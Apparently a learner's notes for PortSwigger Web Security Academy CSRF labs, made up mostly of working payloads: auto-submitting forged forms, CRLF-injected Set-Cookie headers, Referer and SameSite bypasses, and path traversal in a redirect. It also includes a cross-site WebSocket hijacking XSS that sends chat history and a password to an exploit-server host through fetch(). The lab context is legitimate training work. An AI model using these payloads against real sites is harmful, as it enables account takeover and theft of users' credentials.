## LAB payloads
```html
# no defense
<form class="login-form" name="change-email-form" action="https://...web-security-academy.
net/my-account/change-email" method="POST">
<label>Email</label>
<input required type="email" name="email" value="changed@email.com">
</form>
 <script>
 document.forms[0].submit();
 </script>
 
 <form method="POST" action="https://...web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>

# depends on req method
<form class="login-form" name="change-email-form" action="https://...web-security-academy.
net/my-account/change-email" method="GET">
<label>Email</label>
<input required type="email" name="email" value="changed@email.com">
</form>
 <script>
 document.forms[0].submit();
 </script>
 
 <form action="https://...web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>

# csrf might be deleted
<form class="login-form" name="change-email-form" action="https://...web-security-academy.
net/my-account/change-email" method="POST">
<label>Email</label>
<input required type="email" name="email" value="changed@email.com">
</form>
<script>
document.forms[0].submit();
</script>

<form method="POST" action="https://...web-security-academy.net/my-account/change-email">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
    document.forms[0].submit();
</script>

# csrf is not tied to user session:
<form class="login-form" name="change-email-form" action="https://...web-security-academy.
net/my-account/change-email" method="POST">
<label>Email</label>
<input required type="email" name="email" value="changed@email.com">
<input required type="hidden" name="csrf" value="IjtfcxUU8ULUIOddkyC0tfqGpsAwEall">
</form>
 <script>
 document.forms[0].submit();
 </script>

# tied to non-session cookie
<form action="https://...web-security-academy.net/my-account/change-email" method="POST">
<input required type="email" name="email" value="changed_2@email.com">
<input required type=hidden name=csrf value=kuc5J5EtTt0fWVvF68NEDKwX2iKu13Zg>
</form>
<img src="https://...web-security-academy.net/?
search=something%0d%0aSet-Cookie:%20csrfKey=lS3zfYWX6kSlQ5M97H0SykSUKztre8aa%3b%20SameSite=None" onerror=document.forms[0].submit()>

# duplicated in set-cookie header
<form action="https://...web-security-academy.net/my-account/change-email" method="POST">
<input required type="email" name="email" value="changed_2@email.com">
<input required type=hidden name=csrf value=aabbcc23b>
</form>
<img src="https://...web-security-academy.net/?search=something%0d%0aSet-Cookie:%20csrf=aabbcc23b%3b%20SameSite=None" 
onerror=document.forms[0].submit()>

# depends on header being presented
<meta name="referrer" content="never">
<form action="https://...web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="kok@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
or
<meta name="referrer" content="no-referrer">

# broken Referer validation
<meta name="referrer" content="unsafe-url">
<script>
history.pushState('', '', '/?...web-security-academy.net')
</script>
<form action="https://...web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="kok@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
```

### SameSite=Lax bypasses
- method override:
  - check change email func - no csrf
  - check that login - no SameSite set => Lax by browser by default => cookie will be sent in cross-site GET 
    requests, as long as they involve a top-level navigation.
  - POST /my-account/change-email request to Burp Repeater
  - change to GET and send - get rejection
  - try this ```GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1``` - accepted
  - exploit server:
    - ```html
      <script> document.location="https://...web-security-academy.net/my-account/change-email?
      email=pwned@web-security-academy.net&_method=POST";
      </script>
      ```
- client-side redirect:
  - ```POST /my-account/change-email``` - no CSRF
  - ```POST /login``` - SameSite=Strict
  - go to comments. find that you're initially sent to a confirmation page at ```/post/comment/confirmation?
    postId=x``` but, after a few seconds, you're taken back to the blog post
  - find in resurces: ```/resources/js/commentConfirmationRedirect.js``` - it uses the postId query parameter to 
    dynamically construct the path for the client-side redirect
  - find that you can use path traversal in confirmation URL ```/post/comment/confirmation?postId=1/../../my-account```
  - exploit server:
    - ```html
      <script>document.location = "https://...web-security-academy.net/post/comment/confirmation?postId=..
      /my-account";</script>
      ```
    - now craft it to exploit change email:
      - ```html
        <script> document.location = "https://...web-security-academy.net/post/comment/confirmation?
        postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
        </script>
        ```
      - include the submit parameter and URL encode the ampersand delimiter to avoid breaking out of the postId 
        parameter in the initial setup request
- bypass via sibling domain:
  - look into resources 
  - find that there is ACAO for https://cms-...web-security-academy.net 
  - find that there is XSS in username field 
  - so idea - use that domain to keep session
  - ```html
    <script>
    let socket = new WebSocket("wss://...web-security-academy.net/chat");
    socket.onopen = function(event) {
    socket.send("READY");
    };
    socket.onmessage = function(event) {
    fetch('https://exploit-...exploit-server.net/log?'+event.data, {method: 'GET', mode:'no-cors'});
    };
    </script>
    ```
  - if you paste that into the username field then you will obtain the whole history of your conversation. 
  - also notice that it is possible to use GET method on cms
  - copy password but don’t copy last double quote
  - ```html
    <script>
    document.location="https://cms-...web-security-academy.net/login?
    username=%3Cscript%3E+let+socket+%3D+new+WebSocket%28%22wss%3A%2F%2F0...
    web-security-academy.net%2Fchat%22%29%3B+socket.onopen+%3D+function%28event%29+%7B+socket.
    send%28%22READY%22%29%3B+%7D%3B+socket.onmessage+%3D+function%28event%29+%7B+fetch%28%27https%3A%2F%2Fexploit-...
    exploit-server.net%2Flog%3F%27%2Bevent.data%2C+%7Bmethod%3A+%27GET%27%2C+mode%3A%27no-cors%27%7D%29%3B+%7D%3B+%3C
    %2Fscript%3E&password=sds";
    </script>
    ```
- bypass via cookie refresh:
  - Browsers block popups from being opened unless they are triggered by a manual user interaction, such as a click. 
    The victim user will click on any page you send them to, so you can create popups using a global event handler 
    as follows: ```<script>
    window.onclick = () => {
        window.open('about:blank')
    }
</script>```
  - if a website doesn't include a SameSite attribute when setting a cookie, Chrome automatically applies Lax 
    restrictions by default. However, to  avoid breaking single sign-on (SSO) mechanisms, it doesn't actually 
    enforce these restrictions for the first 120 seconds on top-level POST requests. As a result, there is a 
    two-minute window in which users may be susceptible to cross-site attacks
  - use this before 2 minutes are left:
    - ```html
        <script>
        history.pushState('', '', '/')
        </script>
        <form action="https://...web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="kek@kok.com" />
        <input type="submit" value="Submit request" />
        </form>
        <script>
        document.forms[0].submit();
        </script>
        ```